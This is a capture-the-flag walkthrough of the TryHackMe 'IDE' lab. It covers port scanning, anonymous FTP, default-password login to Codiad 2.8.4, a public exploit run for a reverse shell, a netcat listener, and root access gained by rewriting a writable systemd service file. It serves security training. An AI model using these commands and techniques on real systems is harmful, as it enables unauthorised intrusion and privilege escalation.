<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 10.10.101.244 -p- -T4 -v

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 10:19 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:19
Completed NSE at 10:19, 0.00s elapsed
Initiating NSE at 10:19
Completed NSE at 10:19, 0.00s elapsed
Initiating NSE at 10:19
Completed NSE at 10:19, 0.00s elapsed
Initiating Ping Scan at 10:19
Scanning 10.10.101.244 [4 ports]
Completed Ping Scan at 10:19, 0.37s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:19
Completed Parallel DNS resolution of 1 host. at 10:19, 0.03s elapsed
Initiating SYN Stealth Scan at 10:19
Scanning 10.10.101.244 [65535 ports]
Discovered open port 21/tcp on 10.10.101.244
Discovered open port 22/tcp on 10.10.101.244
Discovered open port 80/tcp on 10.10.101.244
Increasing send delay for 10.10.101.244 from 0 to 5 due to 534 out of 1334 dropped probes since last increase.
Increasing send delay for 10.10.101.244 from 5 to 10 due to 13 out of 31 dropped probes since last increase.
SYN Stealth Scan Timing: About 5.37% done; ETC: 10:29 (0:09:06 remaining)
SYN Stealth Scan Timing: About 7.46% done; ETC: 10:33 (0:12:37 remaining)
SYN Stealth Scan Timing: About 9.07% done; ETC: 10:36 (0:15:12 remaining)
SYN Stealth Scan Timing: About 13.10% done; ETC: 10:35 (0:13:23 remaining)
SYN Stealth Scan Timing: About 17.02% done; ETC: 10:34 (0:12:16 remaining)
SYN Stealth Scan Timing: About 21.33% done; ETC: 10:34 (0:11:30 remaining)
SYN Stealth Scan Timing: About 25.68% done; ETC: 10:34 (0:10:45 remaining)
SYN Stealth Scan Timing: About 30.40% done; ETC: 10:34 (0:10:00 remaining)
SYN Stealth Scan Timing: About 35.56% done; ETC: 10:34 (0:09:16 remaining)
SYN Stealth Scan Timing: About 40.74% done; ETC: 10:34 (0:08:32 remaining)
SYN Stealth Scan Timing: About 45.59% done; ETC: 10:34 (0:07:47 remaining)
Discovered open port 62337/tcp on 10.10.101.244
SYN Stealth Scan Timing: About 50.61% done; ETC: 10:34 (0:07:03 remaining)
SYN Stealth Scan Timing: About 55.62% done; ETC: 10:33 (0:06:19 remaining)
SYN Stealth Scan Timing: About 61.02% done; ETC: 10:33 (0:05:32 remaining)
SYN Stealth Scan Timing: About 66.05% done; ETC: 10:33 (0:04:49 remaining)
SYN Stealth Scan Timing: About 71.25% done; ETC: 10:33 (0:04:05 remaining)
SYN Stealth Scan Timing: About 76.45% done; ETC: 10:34 (0:03:22 remaining)
SYN Stealth Scan Timing: About 81.37% done; ETC: 10:33 (0:02:39 remaining)
SYN Stealth Scan Timing: About 86.45% done; ETC: 10:33 (0:01:55 remaining)
SYN Stealth Scan Timing: About 91.61% done; ETC: 10:33 (0:01:11 remaining)
Completed SYN Stealth Scan at 10:34, 862.28s elapsed (65535 total ports)
Initiating Service scan at 10:34
Scanning 4 services on 10.10.101.244
Completed Service scan at 10:34, 12.07s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.10.101.244
Retrying OS detection (try #2) against 10.10.101.244
Retrying OS detection (try #3) against 10.10.101.244
Retrying OS detection (try #4) against 10.10.101.244
Retrying OS detection (try #5) against 10.10.101.244
Initiating Traceroute at 10:34
Completed Traceroute at 10:34, 0.17s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 10:34
Completed Parallel DNS resolution of 2 hosts. at 10:34, 0.03s elapsed
NSE: Script scanning 10.10.101.244.
Initiating NSE at 10:34
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 10:34, 5.17s elapsed
Initiating NSE at 10:34
Completed NSE at 10:34, 1.53s elapsed
Initiating NSE at 10:34
Completed NSE at 10:34, 0.00s elapsed
Nmap scan report for 10.10.101.244
Host is up (0.16s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.1.243
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2bed33ce87681ef477ed043d4281428 (RSA)
|   256 a882e961e4bb61af9f3a193b64bcde87 (ECDSA)
|_  256 244675a76339b63ce9f1fca413516320 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/3%OT=21%CT=1%CU=32851%PV=Y%DS=2%DC=T%G=Y%TM=6401BF31
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=FF%
OS:GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3=M
OS:506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B
OS:3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%
OS:CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 2.086 days (since Wed Mar  1 08:30:52 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   162.80 ms 10.18.0.1
2   160.82 ms 10.10.101.244

NSE: Script Post-scanning.
Initiating NSE at 10:34
Completed NSE at 10:34, 0.00s elapsed
Initiating NSE at 10:34
Completed NSE at 10:34, 0.00s elapsed
Initiating NSE at 10:34
Completed NSE at 10:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 897.78 seconds
           Raw packets sent: 72421 (3.191MB) | Rcvd: 67859 (2.718MB)
```
We have 4 ports opened. Port 21, port 22, port 80 and port 62337.



<h2>Enumeration Port 21</h2>

Since Anonymous login is allowed this means we can login with the default credentials.

```username:anonymous```      ```password:anonymous```

command used: ftp 10.10.101.244

![image](https://user-images.githubusercontent.com/67879936/222686856-14dd1c86-c70d-4640-88ba-719895346b82.png)

Now that we are logged in lets look for files that might help us gain access to the machine

![image](https://user-images.githubusercontent.com/67879936/222686980-5ee088b2-f24c-499c-8fbc-0df916859e77.png)

There was a file ```-```, so we will use the get command to download the file to our machine. After downloading the file, we will have to rename it, I renamed mine to ```ftp_file```, then I used the cat command to view the contents of the file.

>command: cat ftp_file

![image](https://user-images.githubusercontent.com/67879936/222687716-0cf9277b-af8e-4a2b-9939-d17c23a49973.png)

The contents of the file gives us 2 users, ```john``` and ```drac```. Also, we can see that the content of the file was from user ```drac``` to user “john”. This means when we find a login page which we will, the username should be john and the password would be a default password (we will have to try some default passwords). Since, that was the only file in the ftp directory lets move on with enumeration.



<h2>Enumeration Port 80</h2>

Going over to the webpage there was nothing there

![image](https://user-images.githubusercontent.com/67879936/222688532-bce837b4-3bb8-49b8-92e0-cc1ac3e0ebcf.png)

Lets fire up gobuster to search for hidden directories

>command: gobuster dir -u http://10.10.101.244 -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/IDE]
└─$ gobuster dir -u http://10.10.101.244 -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.101.244
[+] Method:                  GET
[+] Threads:                 16
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
2023/03/03 10:52:40 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 278]
Progress: 23070 / 23075 (99.98%)
===============================================================
2023/03/03 10:57:12 Finished
===============================================================

```
From the scan above we can see that there is nothing for us in this port, so lets move on to the next port.




<h2>Enumeration Port 62337</h2>

Going over to the webpage we find a login page

![image](https://user-images.githubusercontent.com/67879936/222690787-b5ed490f-f63e-4a2b-97e4-06d815566148.png)

Lets fire up gobuster again to search for hidden directories

>command: gobuster dir -u http://10.10.101.244:62337 -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/IDE]
└─$ gobuster dir -u http://10.10.101.244:62337 -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.101.244:62337
[+] Method:                  GET
[+] Threads:                 16
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
2023/03/03 11:01:45 Starting gobuster in directory enumeration mode
===============================================================
/common.php           (Status: 200) [Size: 0]
/components           (Status: 301) [Size: 328] [--> http://10.10.101.244:62337/components/]
/config.php           (Status: 200) [Size: 0]
/data                 (Status: 301) [Size: 322] [--> http://10.10.101.244:62337/data/]
/favicon.ico          (Status: 200) [Size: 1150]
/index.php            (Status: 200) [Size: 5239]
/index.php            (Status: 200) [Size: 5239]
/js                   (Status: 301) [Size: 320] [--> http://10.10.101.244:62337/js/]
/languages            (Status: 301) [Size: 327] [--> http://10.10.101.244:62337/languages/]
/lib                  (Status: 301) [Size: 321] [--> http://10.10.101.244:62337/lib/]
/LICENSE.txt          (Status: 200) [Size: 1133]
/plugins              (Status: 301) [Size: 325] [--> http://10.10.101.244:62337/plugins/]
/server-status        (Status: 403) [Size: 281]
/themes               (Status: 301) [Size: 324] [--> http://10.10.101.244:62337/themes/]
Progress: 23070 / 23075 (99.98%)
===============================================================
2023/03/03 11:06:21 Finished
===============================================================

```
Now, we found some hidden directories but lets be more particular about the login page. If you recall in our enumeration for port 21 there was a user ```john``` with a default password. What we have to do now is try defaults password for the user “john”. After so many tries a default I found the password.

```username:john```                  ```password: password```

Logging in with those credentials we gained access to the webpage

![image](https://user-images.githubusercontent.com/67879936/222692215-741b9ca1-a1dd-4dfa-a504-3dbe9f78bddd.png)




<h2>Exploitation</h2>

How do we exploit this to gain a reverse shell to our machine???

Going back to our nmap scan on this particular port we can see the website running on the port is running on ```codiad 2.8.4```

![image](https://user-images.githubusercontent.com/67879936/222692539-3e0c0c6a-1204-4206-8801-4f15bbba0e5c.png)

After a little research I found the exploit

![image](https://user-images.githubusercontent.com/67879936/222692621-3267c3f4-3c4b-4df1-b27a-b3eb77e977dd.png)

Link to exploit: https://www.exploit-db.com/exploits/49705

Lets download the exploit to our machine, then we run it

>command: python3 49705.py http://10.10.101.244:62337/ john password 10.18.1.243 1234 linux
  
![image](https://user-images.githubusercontent.com/67879936/222694342-84bb0a19-9c11-45ff-9657-58f5cf45c14f.png)

Before answering with ```Y``` we have to run those 2 commands on 2 different terminals

![image](https://user-images.githubusercontent.com/67879936/222694544-2e835584-e8c9-4007-b6df-7bcc2f5a44d3.png)

![image](https://user-images.githubusercontent.com/67879936/222694586-d69cbfb3-440d-4014-84c2-7dabdf0e77f3.png)

After running those 2 commands on 2 different terminals we can then proceed with the exploitation (Your input should be Y)

![image](https://user-images.githubusercontent.com/67879936/222694881-5d125e29-714b-4814-8e64-bf541315a954.png)

Now, going to the other 2 terminals we should have gotten a reverse shell

![image](https://user-images.githubusercontent.com/67879936/222695051-20180354-5cd3-43d3-891f-ca642496a757.png)

![image](https://user-images.githubusercontent.com/67879936/222695092-5c7e3f5c-7ac9-4bc2-a24c-c2bd793e2b71.png)

Yes, we got a reverse shell as user “www-data”.

We can stabilize this shell using the following command

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=screen
```
![image](https://user-images.githubusercontent.com/67879936/222695384-01ff6569-b8e5-4aea-b3e1-658516807554.png)



<h2>Privilege Escalation</h2>

Going to _/home/drac_ directory, lets try to read the ```.bash_history``` file

![image](https://user-images.githubusercontent.com/67879936/222695986-4efaa87d-5a65-4f47-b102-e7fc21486196.png)

Reading the ```.bash_history``` file gives us the password for the user ```drac```. Lets go ahead and switch the user to ```drac```.

checking sudo permissions

>command: sudo -l

![image](https://user-images.githubusercontent.com/67879936/222696347-b38faeea-84d1-411c-ba3a-41d90fb7d7b8.png)

This means we can run the ```/usr/sbin/service``` with sudo privileges

Now, lets send the Linux local Privilege Escalation Awesome Script (linPEAS) from our machine to the target’s machine, and run it on the target’s machine.

To use linPEAS you can read more about it here: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

After running linPEAS, something interesting pops up

![image](https://user-images.githubusercontent.com/67879936/222696672-7fdd4582-5257-42ed-aa9e-7cbb654a45b1.png)

What this means is that we can write to the ```vsftpd.service``` file. Lets head over to the directory to view the content of ```vsftpd.service```

![image](https://user-images.githubusercontent.com/67879936/222697104-fc3a965b-f208-46cd-ab7c-1840b9b4c5df.png)

Since we can write to this file, lets modify it and add a reverse shell there. So, we will create a ```vsftpd.service``` file on our machine and send it to the target’s machine so it can overwrite the previous ```vsftpd.service``` file

![image](https://user-images.githubusercontent.com/67879936/222697575-9a2b7e2c-e87d-4094-b092-c5bcb8feacce.png)

This will be the content of the ```vsftpd.service``` file we will be sending over to the target.

![image](https://user-images.githubusercontent.com/67879936/222697667-7e68c5fe-2c23-43d3-8397-5d461e75f8d8.png)


Now that we have the file in our target’s machine lets overwrite the previous file

command used: cp vsftpd.service /etc/systemd/system/multi-user.target.wants/vsftpd.service

Lets go back to that directory to check if we’ve truly changed the content of the file

![image](https://user-images.githubusercontent.com/67879936/222697989-d2d6c5ef-8116-4078-8f1b-c64cc99df7a2.png)

Alright, so we’ve successfully changed the content of the ```vsftpd.service``` file. What’s left to do now is to setup our netcat listener so we can listen for incoming connections

>rlwarap nc -lvnp 4444

Now, lets run the file

```
sudo /usr/sbin/service vsftpd restart
systemctl daemon-reload
sudo /usr/sbin/service vsftpd restart
```
![image](https://user-images.githubusercontent.com/67879936/222698433-59777ccc-ea2a-4f54-b2d1-f748e639751b.png)

Going over to our netcat listener

![image](https://user-images.githubusercontent.com/67879936/222698493-9f065dc0-7187-42bd-9ff9-0806830b9389.png)

Boom!!! We got shell as the root user

That will be all for today
<br> <br>
[Back To Home](../../index.md)

  
  














